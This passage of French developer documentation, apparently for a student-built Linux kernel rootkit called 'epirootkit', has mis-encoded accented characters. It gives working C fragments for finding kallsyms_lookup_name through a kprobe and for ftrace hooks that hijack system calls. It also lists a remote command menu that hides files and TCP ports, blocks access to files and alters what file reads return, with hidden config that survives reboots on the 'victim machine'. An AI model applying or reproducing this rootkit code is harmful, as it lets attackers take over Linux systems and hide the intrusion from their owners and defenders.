<div class="ttc" id="aforbid_8c_html_ac71e6b72dd491c3ff7b0334e1f388f44"><div class="ttname"><a href="../../dc/dfc/forbid_8c.html#ac71e6b72dd491c3ff7b0334e1f388f44">stat_hook</a></div><div class="ttdeci">asmlinkage long notrace stat_hook(const struct pt_regs *regs)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dfc/forbid_8c_source.html#l00020">forbid.c:20</a></div></div>
<div class="ttc" id="aforbid_8c_html_ada76679bffc7821d9893455db4813201"><div class="ttname"><a href="../../dc/dfc/forbid_8c.html#ada76679bffc7821d9893455db4813201">__orig_fstat</a></div><div class="ttdeci">asmlinkage long(* __orig_fstat)(const struct pt_regs *)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dfc/forbid_8c_source.html#l00008">forbid.c:8</a></div></div>
<div class="ttc" id="aforbid_8c_html_ae32e5cb44540533f60b81e4ae52e859f"><div class="ttname"><a href="../../dc/dfc/forbid_8c.html#ae32e5cb44540533f60b81e4ae52e859f">__orig_stat</a></div><div class="ttdeci">asmlinkage long(* __orig_stat)(const struct pt_regs *)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dfc/forbid_8c_source.html#l00009">forbid.c:9</a></div></div>
<div class="ttc" id="aforbid_8c_html_ae57c99a859f85f46bca995e81dd73c33"><div class="ttname"><a href="../../dc/dfc/forbid_8c.html#ae57c99a859f85f46bca995e81dd73c33">openat_hook</a></div><div class="ttdeci">asmlinkage long notrace openat_hook(const struct pt_regs *regs)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dfc/forbid_8c_source.html#l00013">forbid.c:13</a></div></div>
<div class="ttc" id="aftrace_8h_html_aab9ca6da4cf514341b664e97f145dc1f"><div class="ttname"><a href="../../d5/d29/ftrace_8h.html#aab9ca6da4cf514341b664e97f145dc1f">HOOK</a></div><div class="ttdeci">#define HOOK(_name, _hook, _orig)</div><div class="ttdef"><b>Definition</b> <a href="../../d5/d29/ftrace_8h_source.html#l00024">ftrace.h:24</a></div></div>
<div class="ttc" id="aftrace_8h_html_afa697c23f08f00ffd9625f6da1d4ffe8"><div class="ttname"><a href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS</a></div><div class="ttdeci">#define HOOK_SYS(_name, _hook, _orig)</div><div class="ttdef"><b>Definition</b> <a href="../../d5/d29/ftrace_8h_source.html#l00018">ftrace.h:18</a></div></div>
<div class="ttc" id="ahide_8c_html_a25875c3a0e7c9ebc4533731bb98a5768"><div class="ttname"><a href="../../de/deb/hide_8c.html#a25875c3a0e7c9ebc4533731bb98a5768">recvmsg_hook</a></div><div class="ttdeci">asmlinkage long notrace recvmsg_hook(const struct pt_regs *regs)</div><div class="ttdef"><b>Definition</b> <a href="../../de/deb/hide_8c_source.html#l00156">hide.c:156</a></div></div>
<div class="ttc" id="ahide_8c_html_a633e6a45f4fd262cff62ed627198bf3e"><div class="ttname"><a href="../../de/deb/hide_8c.html#a633e6a45f4fd262cff62ed627198bf3e">getdents64_hook</a></div><div class="ttdeci">asmlinkage int notrace getdents64_hook(const struct pt_regs *regs)</div><div class="ttdef"><b>Definition</b> <a href="../../de/deb/hide_8c_source.html#l00011">hide.c:11</a></div></div>
<div class="ttc" id="ahide_8c_html_a6f6985ce4f31df32aa9a0466826796ed"><div class="ttname"><a href="../../de/deb/hide_8c.html#a6f6985ce4f31df32aa9a0466826796ed">__orig_tcp6_seq_show</a></div><div class="ttdeci">asmlinkage long(* __orig_tcp6_seq_show)(struct seq_file *seq, void *v)</div><div class="ttdef"><b>Definition</b> <a href="../../de/deb/hide_8c_source.html#l00008">hide.c:8</a></div></div>
<div class="ttc" id="ahide_8c_html_a93b8d4cf1b9a2ebf9b0e642eaab52fa2"><div class="ttname"><a href="../../de/deb/hide_8c.html#a93b8d4cf1b9a2ebf9b0e642eaab52fa2">tcp6_seq_show_hook</a></div><div class="ttdeci">asmlinkage long notrace tcp6_seq_show_hook(struct seq_file *seq, void *v)</div><div class="ttdef"><b>Definition</b> <a href="../../de/deb/hide_8c_source.html#l00144">hide.c:144</a></div></div>
<div class="ttc" id="ahide_8c_html_a9a588e3d7a442f79438c99ae9c46b6cf"><div class="ttname"><a href="../../de/deb/hide_8c.html#a9a588e3d7a442f79438c99ae9c46b6cf">__orig_recvmsg</a></div><div class="ttdeci">asmlinkage long(* __orig_recvmsg)(const struct pt_regs *regs)</div><div class="ttdef"><b>Definition</b> <a href="../../de/deb/hide_8c_source.html#l00009">hide.c:9</a></div></div>
<div class="ttc" id="ahide_8c_html_aba501edbfd8175fb82cd90ee84a8d33c"><div class="ttname"><a href="../../de/deb/hide_8c.html#aba501edbfd8175fb82cd90ee84a8d33c">tcp4_seq_show_hook</a></div><div class="ttdeci">asmlinkage long notrace tcp4_seq_show_hook(struct seq_file *seq, void *v)</div><div class="ttdef"><b>Definition</b> <a href="../../de/deb/hide_8c_source.html#l00135">hide.c:135</a></div></div>
<div class="ttc" id="ahide_8c_html_ac44c2733f8af7c2c57ab9bba3e85835c"><div class="ttname"><a href="../../de/deb/hide_8c.html#ac44c2733f8af7c2c57ab9bba3e85835c">__orig_tcp4_seq_show</a></div><div class="ttdeci">asmlinkage long(* __orig_tcp4_seq_show)(struct seq_file *seq, void *v)</div><div class="ttdef"><b>Definition</b> <a href="../../de/deb/hide_8c_source.html#l00007">hide.c:7</a></div></div>
<div class="ttc" id="ahide_8c_html_ac94011be5f0bbfd7f49bc58dfa342001"><div class="ttname"><a href="../../de/deb/hide_8c.html#ac94011be5f0bbfd7f49bc58dfa342001">__orig_getdents64</a></div><div class="ttdeci">asmlinkage int(* __orig_getdents64)(const struct pt_regs *regs)</div><div class="ttdef"><b>Definition</b> <a href="../../de/deb/hide_8c_source.html#l00006">hide.c:6</a></div></div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md75"></a>
3.1.3 kallsyms</h4>
<p>Afin de rÃ©soudre lâ€™adresse de <code>kallsyms_lookup_name</code> et de pouvoir localiser dynamiquement les symboles non exportÃ©s, nous avons crÃ©Ã© un kprobe temporaire, pour ensuite lire lâ€™adresse retournÃ©e dans <code>kp.addr</code> dÃ¨s que <code>register_kprobe</code> rÃ©ussit. Cette opÃ©ration est exÃ©cutÃ©e une seule fois : on stocke lâ€™adresse dans une variable statique pour Ã©viter dâ€™interroger le noyau Ã  chaque hook. </p><div class="fragment"><div class="line"><span class="keyword">typedef</span> <span class="keywordtype">unsigned</span> long (*kallsyms_lookup_name_t)(<span class="keyword">const</span> <span class="keywordtype">char</span> *);</div>
<div class="line"><span class="keyword">static</span> kallsyms_lookup_name_t fh_kallsyms_lookup_ptr = NULL;</div>
<div class="line"><span class="keywordtype">int</span> ret;</div>
<div class="line"><span class="keyword">struct </span>kprobe kp = {</div>
<div class="line">    .symbol_name = <span class="stringliteral">&quot;kallsyms_lookup_name&quot;</span>,</div>
<div class="line">};</div>
<div class="line"> </div>
<div class="line"><span class="keywordflow">if</span> (fh_kallsyms_lookup_ptr)</div>
<div class="line">    <span class="keywordflow">return</span> fh_kallsyms_lookup_ptr;</div>
<div class="line"> </div>
<div class="line">ret = register_kprobe(&amp;kp);</div>
<div class="line"><span class="keywordflow">if</span> (ret &lt; 0) {</div>
<div class="line">    <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;fh_init_kallsyms_lookup: register_kprobe failed\n&quot;</span>);</div>
<div class="line">    <span class="keywordflow">return</span> NULL;</div>
<div class="line">}</div>
<div class="line"> </div>
<div class="line">fh_kallsyms_lookup_ptr = (kallsyms_lookup_name_t)kp.addr;</div>
<div class="line">unregister_kprobe(&amp;kp);</div>
<div class="ttc" id="aconfig_8h_html_a28aac7cd72bc6ccb4340f7985d0d5449"><div class="ttname"><a href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a></div><div class="ttdeci">#define ERR_MSG(fmt, args...)</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00016">config.h:16</a></div></div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md76"></a>
3.1.5 fh_install_hook</h4>
<p>Une fois la fonction <code>kallsyms_lookup_name</code> disponible, la suite du processus repose sur la fonction <code><a class="el" href="../../dd/d2c/ftrace_8c.html#a79f4141dc05f6e7ba983e8e9f4c2f646" title="Install an individual ftrace hook.">fh_install_hook(struct ftrace_hook *hook)</a></code>. Elle prend en argument un pointeur vers une structure <a class="el" href="../../de/d57/structftrace__hook.html">ftrace_hook</a>. On appelle dâ€™abord <code>kallsyms_lookup(hook-&gt;name)</code> pour rÃ©cupÃ©rer lâ€™adresse effective de la fonction cible dans le noyau. Si cette adresse est valide, on la copie immÃ©diatement dans la variable hook-&gt;original, afin quâ€™elle pointe dÃ©sormais vers la fonction native. Donc, Ã  chaque fois que dans notre fonction <em>custom</em> nous souhaitons invoquer lâ€™implÃ©mentation de base, nous lirons lâ€™adresse stockÃ©e dans <code>*hook-&gt;original</code>. </p><div class="fragment"><div class="line"><span class="keywordtype">int</span> err;</div>
<div class="line"><span class="keywordtype">unsigned</span> long (*kallsyms_lookup)(<span class="keyword">const</span> <span class="keywordtype">char</span> *) = <a class="code hl_variable" href="../../dd/d2c/ftrace_8c.html#abd2f583219dba0e4dbb721956733ec26">fh_init_kallsyms_lookup</a>();</div>
<div class="line"><span class="keywordflow">if</span> (!kallsyms_lookup) {</div>
<div class="line">    <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;ftrace: unable to get kallsyms_lookup_name pointer\n&quot;</span>);</div>
<div class="line">    <span class="keywordflow">return</span> -ENOENT;</div>
<div class="line">}</div>
<div class="line"> </div>
<div class="line">hook-&gt;address = kallsyms_lookup(hook-&gt;name);</div>
<div class="line"><span class="keywordflow">if</span> (!hook-&gt;address) {</div>
<div class="line">    <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;ftrace: unresolved symbol\n&quot;</span>);</div>
<div class="line">    <span class="keywordflow">return</span> -ENOENT;</div>
<div class="line">}</div>
<div class="line"> </div>
<div class="line">*((<span class="keywordtype">unsigned</span> <span class="keywordtype">long</span> *)hook-&gt;original) = hook-&gt;address;</div>
<div class="line"> </div>
<div class="line">hook-&gt;ops.func = <a class="code hl_function" href="../../dd/d2c/ftrace_8c.html#a37d6b63d5a5011f2b5a14461bfe8ef12">fh_ftrace_thunk</a>;</div>
<div class="line">hook-&gt;ops.flags = FTRACE_OPS_FL_SAVE_REGS </div>
<div class="line">                | FTRACE_OPS_FL_RECURSION </div>
<div class="line">                | FTRACE_OPS_FL_IPMODIFY;</div>
<div class="line"> </div>
<div class="line">err = ftrace_set_filter_ip(&amp;hook-&gt;ops, hook-&gt;address, 0, 0);</div>
<div class="line"><span class="keywordflow">if</span> (err) {</div>
<div class="line">    <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;ftrace: ftrace_set_filter_ip() failed.\n&quot;</span>);</div>
<div class="line">    <span class="keywordflow">return</span> err;</div>
<div class="line">}</div>
<div class="line"> </div>
<div class="line">err = register_ftrace_function(&amp;hook-&gt;ops);</div>
<div class="line"><span class="keywordflow">if</span> (err) {</div>
<div class="line">    <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;ftrace: register_ftrace_function() failed.\n&quot;</span>);</div>
<div class="line">    <span class="keywordflow">return</span> err;</div>
<div class="line">}</div>
<div class="line"><span class="keywordflow">return</span> 0;</div>
<div class="ttc" id="aftrace_8c_html_a37d6b63d5a5011f2b5a14461bfe8ef12"><div class="ttname"><a href="../../dd/d2c/ftrace_8c.html#a37d6b63d5a5011f2b5a14461bfe8ef12">fh_ftrace_thunk</a></div><div class="ttdeci">static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)</div><div class="ttdoc">ftrace callback that redirects execution to the hook function.</div><div class="ttdef"><b>Definition</b> <a href="../../dd/d2c/ftrace_8c_source.html#l00044">ftrace.c:44</a></div></div>
<div class="ttc" id="aftrace_8c_html_abd2f583219dba0e4dbb721956733ec26"><div class="ttname"><a href="../../dd/d2c/ftrace_8c.html#abd2f583219dba0e4dbb721956733ec26">fh_init_kallsyms_lookup</a></div><div class="ttdeci">unsigned long(*)(const char *) fh_init_kallsyms_lookup(void)</div><div class="ttdoc">Retrieve the address of kallsyms_lookup_name via kprobe.</div><div class="ttdef"><b>Definition</b> <a href="../../dd/d2c/ftrace_8c_source.html#l00013">ftrace.c:13</a></div></div>
</div><!-- fragment --><p> Ensuite, on configure <code>hook-&gt;ops</code>. On dÃ©finit son champ <code>func</code> pour quâ€™il pointe vers notre callback <code>fh_ftrace_thunk</code>. Cette derniÃ¨re est appelÃ©e par ftrace juste avant que la fonction native soit exÃ©cutÃ©e. Dans <code>ops.flags</code>, on combine trois options ci-dessous. Pour plus de dÃ©tails, voir <a href="https://www.kernel.org/doc/html/v5.3/trace/ftrace-uses.html">The Linux Kernel</a>:</p><ul>
<li><code>FTRACE_OPS_FL_SAVE_REGS</code> pour sauvegarder automatiquement le contexte des registres,</li>
<li><code>FTRACE_OPS_FL_RECURSION</code> prÃ©vient la rÃ©cursion si le callback appelle une fonction dÃ©jÃ  surveillÃ©e (ouch),</li>
<li><code>FTRACE_OPS_FL_IPMODIFY</code> autorise la modification du registre dâ€™instruction (RIP), donc en gros la base du fonctionnement de ftrace pour notre cas.</li>
</ul>
<p>Une fois ces champs positionnÃ©s, on doit informer ftrace quelles adresses doivent etre surveillÃ©es. Câ€™est le rÃ´le de <code>ftrace_set_filter_ip</code>, Ã  laquelle on passe lâ€™adresse calculÃ©e <code>hook-&gt;address</code> et un indicateur Ã  0 pour signifier un ajout. Enfin, on appelle <code>register_ftrace_function(&amp;hook-&gt;ops)</code> pour que le noyau appelle systÃ©matiquement <code>fh_ftrace_thunk</code> lorsquâ€™une invocation Ã  cette adresse se produit.</p>
<h4><a class="anchor" id="autotoc_md77"></a>
3.1.4 fh_ftrace_thunk</h4>
<p>DÃ¨s quâ€™elle est invoquÃ©e, cette fonction rÃ©cupÃ¨re la structure <a class="el" href="../../de/d57/structftrace__hook.html">ftrace_hook</a> grÃ¢ce Ã  <code>container_of</code> (fonction magique), puis vÃ©rifie que le <code>parent_ip</code> ne provient pas du module lui-mÃªme. Enfin, on modifie le registre <code>regs-&gt;ip</code> pour quâ€™il pointe vers notre <em>wrapper</em>. Ainsi, lorsque ftrace rend la main, le flux dâ€™exÃ©cution sautera directement vers la fonction de hook au lieu dâ€™appeler la fonction native ahah ! </p><div class="fragment"><div class="line"><span class="keyword">struct </span><a class="code hl_struct" href="../../de/d57/structftrace__hook.html">ftrace_hook</a> *hook = container_of(<a class="code hl_variable" href="../../de/d57/structftrace__hook.html#ac8ddb477a1c51b9535ade03ecb0e9732">ops</a>, <span class="keyword">struct</span> <a class="code hl_struct" href="../../de/d57/structftrace__hook.html">ftrace_hook</a>, <a class="code hl_variable" href="../../de/d57/structftrace__hook.html#ac8ddb477a1c51b9535ade03ecb0e9732">ops</a>);</div>
<div class="line">  <span class="keywordflow">if</span> (!within_module(parent_ip, THIS_MODULE))</div>
<div class="line">    ((<span class="keyword">struct </span>pt_regs *)regs)-&gt;ip = (<span class="keywordtype">unsigned</span> long)hook-&gt;<a class="code hl_variable" href="../../de/d57/structftrace__hook.html#aea3dcf0c8de30d192ee92494131c4996">function</a>;</div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md78"></a>
3.1.6 Autre</h4>
<p>Les autres fonctions de <a class="el" href="../../dd/d2c/ftrace_8c.html">ftrace.c</a> permettent de gÃ©rer la liste des hooks Ã  installer, ainsi que le dÃ©senregistrement des hooks ftrace (fh_remove_hook, fh_install_hooks et fh_remove_hooks).</p>
<h3><a class="anchor" id="autotoc_md79"></a>
3.2 âš™ï¸ API</h3>
<p>Comme mentionnÃ© dans la section <a href="../../dc/da7/md_pages_204__usage.html">Utilisation</a>, les hooks disposent dâ€™un sous-menu spÃ©cifique dÃ©fini dans <a class="el" href="../../d2/d0a/menu_8c.html">menu.c</a>, permettant dâ€™interagir facilement Ã  distance avec les diffÃ©rentes fonctions. Ce menu repose sur la mÃªme structure et les mÃªmes principes que celui de <a class="el" href="../../da/d32/cmd_8c.html">cmd.c</a>. Pour chaque catÃ©gorie, trois commandes sont disponibles : une pour ajouter un hook, une pour le supprimer, et une pour lister les Ã©lÃ©ments actuellement affectÃ©s par un hook ftrace. Ci-dessous figure un aperÃ§u de ce menu et des diffÃ©rentes fonctions associÃ©es. Lors de lâ€™utilisation, il suffit dâ€™exÃ©cuter la commande help pour afficher lâ€™ensemble des commandes disponibles. Chaque liste de fichiers affectÃ©s par les hooks est dynamique et enregistrÃ©e dans des fichiers de configuration sur la machine victime. Ainsi, Ã  chaque redÃ©marrage, la configuration est automatiquement restaurÃ©e. </p><div class="fragment"><div class="line"><span class="keyword">static</span> <span class="keyword">struct </span><a class="code hl_struct" href="../../dc/d76/structcommand.html">command</a> <a class="code hl_variable" href="../../d2/d0a/menu_8c.html#a39549568647518d60e7c2c252c7a434a">hooks_commands</a>[] = {</div>
<div class="line">    { <span class="stringliteral">&quot;hide&quot;</span>, 4, <span class="stringliteral">&quot;hide a file or directory (getdents64 hook)&quot;</span>, 43, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#a2ded73bcfcafa9cb1db87759d68340a1">hide_dir_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;unhide&quot;</span>, 6, <span class="stringliteral">&quot;unhide a file or directory&quot;</span>, 32, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#acdd5373da69e1e5f78354618635e657e">unhide_dir_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;list_hide&quot;</span>, 9, <span class="stringliteral">&quot;list hidden files/directories&quot;</span>, 34, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#a07cc2c35a196ccc671b5bf6f5c0cdd7e">list_hidden_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;add_port&quot;</span>, 8, <span class="stringliteral">&quot;add port to hide&quot;</span>, 16, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#ae8cfdccf4f659aec0c06201e541a19a3">hide_port_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;remove_port&quot;</span>, 11, <span class="stringliteral">&quot;remove hidden port&quot;</span>, 18, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#a7a7e9c1f9419955454d7b56f7828e861">unhide_port_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;list_port&quot;</span>, 9, <span class="stringliteral">&quot;list hidden ports&quot;</span>, 17, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#a0d0e376cfe707657baa9536fabd47f24">list_hidden_port_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;forbid&quot;</span>, 6, <span class="stringliteral">&quot;forbid open/stat on a file (openat/stat/lstat... hook)&quot;</span>, 55, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#a4654c7ff14a5616b1859dedd865faf1e">forbid_file_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;unforbid&quot;</span>, 8, <span class="stringliteral">&quot;remove forbid on a file&quot;</span>, 30, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#a5ee68221e2c7e53cc6e4666945d04c4d">unforbid_file_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;list_forbid&quot;</span>, 11, <span class="stringliteral">&quot;list forbidden files&quot;</span>, 30, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#acafdbe7a116d66fad7d02139db24a610">list_forbidden_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;modify&quot;</span>, 6, <span class="stringliteral">&quot;[CAREFUL] modify a file with hide/replace operation (read hook)&quot;</span>, 64, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#ab018a31736518a9f03f5bf74ef2ddce2">modify_file_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;unmodify&quot;</span>, 8, <span class="stringliteral">&quot;unmodify a file&quot;</span>, 30, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#ae5a4258de8856fc3bb92b28bd90caa52">unmodify_file_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;list_modify&quot;</span>, 11, <span class="stringliteral">&quot;list alterate rules&quot;</span>, 30, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#a98ce07af9bab247f260aed38a4159dd9">list_alterate_handler</a> },</div>
<div class="line">    { <span class="stringliteral">&quot;help&quot;</span>, 4, <span class="stringliteral">&quot;display hooks help menu&quot;</span>, 25, <a class="code hl_function" href="../../d2/d0a/menu_8c.html#a541c12455a4e9d89397ecbaaabe6a0ab">hooks_help</a> },</div>
<div class="line">    { NULL, 0, NULL, 0, NULL }</div>
<div class="line">};</div>
<div class="ttc" id="amenu_8c_html_a07cc2c35a196ccc671b5bf6f5c0cdd7e"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#a07cc2c35a196ccc671b5bf6f5c0cdd7e">list_hidden_handler</a></div><div class="ttdeci">static int list_hidden_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00144">menu.c:144</a></div></div>
<div class="ttc" id="amenu_8c_html_a0d0e376cfe707657baa9536fabd47f24"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#a0d0e376cfe707657baa9536fabd47f24">list_hidden_port_handler</a></div><div class="ttdeci">static int list_hidden_port_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00089">menu.c:89</a></div></div>
<div class="ttc" id="amenu_8c_html_a2ded73bcfcafa9cb1db87759d68340a1"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#a2ded73bcfcafa9cb1db87759d68340a1">hide_dir_handler</a></div><div class="ttdeci">static int hide_dir_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00100">menu.c:100</a></div></div>
<div class="ttc" id="amenu_8c_html_a39549568647518d60e7c2c252c7a434a"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#a39549568647518d60e7c2c252c7a434a">hooks_commands</a></div><div class="ttdeci">static struct command hooks_commands[]</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00027">menu.c:27</a></div></div>
<div class="ttc" id="amenu_8c_html_a4654c7ff14a5616b1859dedd865faf1e"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#a4654c7ff14a5616b1859dedd865faf1e">forbid_file_handler</a></div><div class="ttdeci">static int forbid_file_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00122">menu.c:122</a></div></div>
<div class="ttc" id="amenu_8c_html_a541c12455a4e9d89397ecbaaabe6a0ab"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#a541c12455a4e9d89397ecbaaabe6a0ab">hooks_help</a></div><div class="ttdeci">static int hooks_help(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00052">menu.c:52</a></div></div>
<div class="ttc" id="amenu_8c_html_a5ee68221e2c7e53cc6e4666945d04c4d"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#a5ee68221e2c7e53cc6e4666945d04c4d">unforbid_file_handler</a></div><div class="ttdeci">static int unforbid_file_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00133">menu.c:133</a></div></div>
<div class="ttc" id="amenu_8c_html_a7a7e9c1f9419955454d7b56f7828e861"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#a7a7e9c1f9419955454d7b56f7828e861">unhide_port_handler</a></div><div class="ttdeci">static int unhide_port_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00078">menu.c:78</a></div></div>
<div class="ttc" id="amenu_8c_html_a98ce07af9bab247f260aed38a4159dd9"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#a98ce07af9bab247f260aed38a4159dd9">list_alterate_handler</a></div><div class="ttdeci">static int list_alterate_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00166">menu.c:166</a></div></div>
<div class="ttc" id="amenu_8c_html_ab018a31736518a9f03f5bf74ef2ddce2"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#ab018a31736518a9f03f5bf74ef2ddce2">modify_file_handler</a></div><div class="ttdeci">static int modify_file_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00177">menu.c:177</a></div></div>
<div class="ttc" id="amenu_8c_html_acafdbe7a116d66fad7d02139db24a610"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#acafdbe7a116d66fad7d02139db24a610">list_forbidden_handler</a></div><div class="ttdeci">static int list_forbidden_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00155">menu.c:155</a></div></div>
<div class="ttc" id="amenu_8c_html_acdd5373da69e1e5f78354618635e657e"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#acdd5373da69e1e5f78354618635e657e">unhide_dir_handler</a></div><div class="ttdeci">static int unhide_dir_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00111">menu.c:111</a></div></div>
<div class="ttc" id="amenu_8c_html_ae5a4258de8856fc3bb92b28bd90caa52"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#ae5a4258de8856fc3bb92b28bd90caa52">unmodify_file_handler</a></div><div class="ttdeci">static int unmodify_file_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00277">menu.c:277</a></div></div>
<div class="ttc" id="amenu_8c_html_ae8cfdccf4f659aec0c06201e541a19a3"><div class="ttname"><a href="../../d2/d0a/menu_8c.html#ae8cfdccf4f659aec0c06201e541a19a3">hide_port_handler</a></div><div class="ttdeci">static int hide_port_handler(char *args, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d0a/menu_8c_source.html#l00067">menu.c:67</a></div></div>
<div class="ttc" id="astructcommand_html"><div class="ttname"><a href="../../dc/d76/structcommand.html">command</a></div><div class="ttdef"><b>Definition</b> <a href="../../d0/dcb/epirootkit_8h_source.html#l00026">epirootkit.h:26</a></div></div>
</div><!-- fragment --><h3><a class="anchor" id="autotoc_md80"></a>
3.3 ğŸš€ Initialisation</h3>
<p>Le fichier <a class="el" href="../../d8/d60/init_8c.html">init.c</a> est appelÃ© dÃ¨s lâ€™insertion du rootkit et permet de gÃ©rer les fichiers pris en charge par dÃ©faut. Il installe les hooks via ftrace, initialise les diffÃ©rentes configurations en rÃ©cupÃ©rant les fichiers associÃ©s, puis les charge en mÃ©moire. Ces fichiers de configuration se trouvent dans un rÃ©pertoire spÃ©cifique, /var/lib/systemd/.epirootkit-hidden-fs (dont lâ€™accÃ¨s est restreint). Les noms des fichiers sont paramÃ©trables dans <a class="el" href="../../db/d16/config_8h.html">include/config.h</a> et incluent notamment :</p><ul>
<li><code>hide_list.cfg</code></li>
<li><code>forbid_list.cfg</code></li>
<li><code>alterate_list.cfg</code></li>
<li><code>passwd.cfg</code></li>
<li><code>hide_ports.cfg</code></li>
<li><code>std.out</code></li>
<li><code>std.err</code></li>
</ul>
<blockquote class="doxtable">
<p>&zwj;Par ailleurs, ce fichier gÃ¨re Ã©galement le dÃ©chargement du rootkit, en sâ€™occupant de la dÃ©sinstallation des hooks et de la mise Ã  jour des fichiers de configuration. </p>
</blockquote>
<h2><a class="anchor" id="autotoc_md81"></a>
4. ğŸª Hooks</h2>
<h3><a class="anchor" id="autotoc_md82"></a>
4.1 ğŸ‘» hide</h3>
<p>La partie <em>hide</em> du rootkit est chargÃ©e de masquer deux catÃ©gories principales dâ€™Ã©lÃ©ments au sein du systÃ¨me : les fichiers et rÃ©pertoires (interception de <code>getdents64</code>), ainsi que les ports TCP (interception de <code>tcp4_seq_show</code>, <code>tcp6_seq_show</code>, et <code>recvmsg</code>)</p>
<h4><a class="anchor" id="autotoc_md83"></a>
4.1.1 Structures</h4>
<p>Le mÃ©canisme de masquage sâ€™appuie sur deux instances de la structure <code>ulist</code> (dÃ©finie dans utils/ulist.c). Ces listes sont dÃ©clarÃ©es et initialisÃ©es dans <a class="el" href="../../d6/dee/hide__api_8c.html">hide_api.c</a>, Ã  partir de deux fichiers de configuration dont les chemins sont dÃ©finis au moment de la compilation. Ensuite, diffÃ©rentes fonctions permettent dâ€™interagir avec ces listes, qui peuvent ainsi stocker les fichiers et ports Ã  altÃ©rer via lâ€™interception des appels systÃ¨me.</p><ul>
<li><code>struct ulist hide_list</code> : liste des chemins (fichiers/rÃ©pertoires) Ã  cacher.</li>
<li><code>struct ulist hide_port_list</code> : liste des ports TCP Ã  cacher.</li>
</ul>
